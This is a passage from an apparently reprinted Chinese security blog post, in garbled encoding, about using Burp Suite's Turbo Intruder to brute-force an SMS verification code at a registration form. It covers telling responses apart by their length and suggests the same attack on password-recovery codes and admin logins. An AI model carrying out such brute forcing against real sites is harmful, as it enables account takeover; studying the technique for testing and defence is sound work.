req.wordcount, req.length and req.response</span><br><span class="line"> if &#x27;error&#x27; not in req.response:</span><br><span class="line">      table.add(req)</span><br></pre></td></tr></table></figure>



<p>å¤åˆ¶è¿™æ®µä»£ç æ›¿æ¢æ‰é»˜è®¤çš„</p>
<p>ç„¶åç‚¹å‡»æœ€ä¸‹æ–¹æ”»å‡»</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/6.png" alt="image"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å„ç§æ•°æ®ï¼Œè¿™é€Ÿåº¦åæ­£æˆ‘æ˜¯çˆ±äº†ï¼Œå¸ˆå‚…ä»¬è¿˜æ²¡çˆ±å—</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/7.png" alt="image"></p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/8.png" alt="image"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”åŒ…ï¼Œæ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»§ç»­è¿›è¡Œæšä¸¾</p>
<p>PSï¼šæ‹¿turbo intruderæšä¸¾æœ‰æ—¶å€™ä¼šå´©ï¼Œä¸ç”¨æ…Œï¼Œå…³æ‰å†æ¥ä¸€éå°±è¡Œäº†</p>
<p>ç”±äºæœ¬äººç”µè„‘é…ç½®å¤ªæ°´åŠ ä¸Šç½‘ç»œæ…¢ï¼Œæ‰€ä»¥è¿˜æ²¡æšä¸¾å®ŒéªŒè¯ç å°±è¿‡æœŸäº†ï¼Œè·Ÿæˆ‘ä¸€æ ·çš„å¸ˆå‚…å¯ä»¥å°è¯•å¤šå‡ æ¬¡</p>
<p>ç»è¿‡ä¸¤ä¸ªå°æ—¶çš„å¥‹æˆ˜åï¼Œç»ˆäºâ€¦â€¦.</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/9.png" alt="image"></p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/10.png" alt="image"></p>
<p>è¢«banäº†</p>
<p><img src="/11.png" alt="image"></p>
<p>æ²¡æœ‰åŠæ³•åªèƒ½æ¢ä¸ªæ‰‹æœºå·ç»§ç»­æ</p>
<p>é‡å¤åšäº†ä¸€éä¹‹å</p>
<p>å½“æˆ‘å†ç‚¹å‡»è·å–éªŒè¯ç ï¼Œæç¤ºè¯¥æ‰‹æœºå·å·²ç»æ³¨å†Œï¼Œè¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿæ„å‘³ç€åˆšåˆšçš„æšä¸¾æˆåŠŸäº†ï¼Œæˆ‘ä»¬å›åˆ°turbo intruderæ‰¾ä¸‹å“åº”åŒ…</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/12.png" alt="image"></p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/13.png" alt="image"></p>
<p>å“åº”åŒ…çš„å­—èŠ‚æ˜¯55ï¼Œä¸å…¶å®ƒçš„åŒ…ä¸ä¸€æ ·æ‰€ä»¥å°±æ˜¯è¿™ä¸ªäº†</p>
<p>å¯ä»¥çœ‹åˆ°å“åº”åŒ…ï¼Œæç¤ºsuccess</p>
<p>å†çœ‹çœ‹å…¶å®ƒçš„å“åº”åŒ…</p>
<p>è¿™ä¸ªå­—èŠ‚76çš„æ˜¯éªŒè¯ç é”™è¯¯</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/14.png" alt="image"></p>
<p>å­—èŠ‚88çš„æ˜¯è¯¥æ‰‹æœºå·²è¢«æ³¨å†Œ</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/15.png" alt="image"></p>
<p>æˆ‘ä»¬ä¼šå‘ç°å‰é¢çš„å…¨æ˜¯å­—èŠ‚76åé¢çš„å…¨88é‚£æˆ‘ä»¬è¦åœ¨76å’Œ88çš„äº¤ç•Œéƒ¨åˆ†æ‰¾æˆåŠŸçš„åŒ…</p>
<p>å¦å¤–ï¼Œå†å£°æ˜ä¸€ä¸‹ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯ä»‹ç»turbo intruderçš„å®æˆ˜ï¼Œé‡ç‚¹åœ¨turbo intruderï¼Œæœ‰çš„å¸ˆå‚…å¯èƒ½ä¼šè§‰å¾—æ³¨å†Œå¤„çˆ†ç ´éªŒè¯ç å¹¶æ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¤§å®¶æƒ³æƒ³ï¼Œæ³¨å†Œå¤„çˆ†ç ´éªŒè¯ç çš„åŸç†å’Œæ‰¾å›å¯†ç å¤„çˆ†ç ´éªŒè¯ç çš„åŸç†æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå†å¤§èƒ†ç‚¹æƒ³è±¡ä¸€ä¸‹ï¼Œè¦æ˜¯ç®¡ç†å‘˜ç™»å½•å¤„æœ‰æ‰¾å›å¯†ç è¿™ä¸€åŠŸèƒ½å‘¢ï¼Ÿå¯¹å§ï¼Ÿ</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
</section>


  <nav id="page-nav" class="clearfix">
    
    <a class="prev" rel="prev" href="/tags/Exploit/page/2/">
      <span class="icon icon-chevron-left"></span>
      <span class="text">Previous</span>
    </a>
    
    
    <a class="next" rel="next" href="/tags/Exploit/page/4/">
      <span class="text">Next</span>
      <span class="icon icon-chevron-right"></span>
    </a>
    
  </nav>

        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/szczecin" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">æ°•æ°˜æ°š</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            ç®€ä»‹
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            å½’æ¡£
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            åˆ†ç±»
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/tags/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
